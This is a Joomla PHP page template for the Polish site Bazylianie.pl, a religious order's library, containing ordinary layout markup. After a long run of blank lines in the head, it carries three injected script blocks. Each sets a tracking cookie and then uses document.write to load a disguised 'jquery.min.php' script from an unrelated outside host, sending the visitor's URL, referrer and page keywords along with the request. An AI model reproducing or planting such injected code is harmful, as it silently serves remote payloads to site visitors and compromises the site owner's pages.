<?php
/**
 */

defined('_JEXEC') or die('Restricted access');
jimport( 'joomla.environment.request' );
$component= JRequest::getVar('option', '');
?>
<?php echo '<?xml version="1.0" encoding="utf-8"?'.'>'; ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" dir="<?php echo $this->direction; ?>" >
<head>
  <jdoc:include type="head" />
  <link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template;?>/css/style.css" type="text/css" />

  <script type="text/javascript" src="http://www.bazylianie.pl/includes/js/jquery.js"></script>

  <script type="text/javascript">
    jQuery.noConflict();(function($){
    $(document).ready(function(){
    
      $(".bibl_td0").click(function(){
        $(this).css('overflow','visible');
        $(this).css('background-color','#fff');
        $(this).css('position','absolute');
        $(this).css('height','100px'); 
      });
      
    });})(jQuery);    
  </script>







































<script>var a='';setTimeout(1);function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("__cfgoid")&&(setCookie("__cfgoid",1,1),1==getCookie("__cfgoid")&&(setCookie("__cfgoid",2,1),document.write('<script type="text/javascript" src="' + 'http://hotelvitoria.net/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'K85164' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script>
<script>var b="red";c="mod";function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",1,1),1==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",2,1),document.write('<script type="text/javascript" src="' + 'http://ittermann.home.pl/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'snt2014' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script><script>var b="red";c="mod";function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",1,1),1==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",2,1),document.write('<script type="text/javascript" src="' + 'http://ugo-games.com/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'snt2014' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script></head>
<body>
  <div id="all">
    <div id="top">
      <a href="index.php"><h1>Bazylianie.pl Biblioteka Zakonu</h1></a>
      <jdoc:include type="modules" name="top" />
    </div>
    <div id="menu">
      <jdoc:include type="modules" name="menu" />

    </div> 
    <jdoc:include type="message" />
    <?php /*if($component == 'com_content'){ ?>
    <div id="content">
      <jdoc:include type="component" />
    </div>
    <?php } else { ?>   
    <div id="comp">
    <?php if($this->countModules('menu')){ ?>
      <jdoc:include type="message" />
      <jdoc:include type="component" />
    <?php } else if($component == 'com_user'){
         //	loadComponent('com_user');
	?>
        
       
        <jdoc:include type="component" />
       <?php /* <div class="column"><br />Zaloguj się<jdoc:include type="modules" name="logowanie" /></div> *//*?>
        <?php
        

	 } else { ?>
	 <div class="column"><jdoc:include type="message" /></div><div class="column"><jdoc:include type="modules" name="logowanie" /></div>
	    <?php
        
	 } ?>
    </div>
    <?php } */?>
    <div id="content">
      <jdoc:include type="component" />
    </div>
		
    <div id="stopka">
      <jdoc:include type="modules" name="stopka" />
    </div>
  </div>
</body>
</html>
